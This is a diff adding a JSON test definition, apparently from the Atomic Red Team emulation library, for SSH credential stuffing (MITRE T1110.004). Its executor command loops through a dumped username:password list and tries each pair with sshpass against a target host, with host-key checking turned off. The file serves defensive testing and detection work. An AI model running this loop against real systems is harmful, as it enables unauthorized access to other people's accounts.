@@ -1,0 +1,37 @@
+{
+    "name": "SSH Credential Stuffing From FreeBSD",
+    "description": "Using username,password combination from a password dump to login over SSH. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "sh",
+    "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.004",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credential Stuffing",
+    "source": "ART",
+    "uuid": "a790d50e-7ebf-48de-8daa-d9367e0911d4",
+    "arguments": {
+        "target_host": {
+            "description": "IP Address / Hostname you want to target.",
+            "type": "string",
+            "default": "localhost"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Requires SSHPASS\n",
+            "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+            "get_prereq_command": "pkg install -y sshpass\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
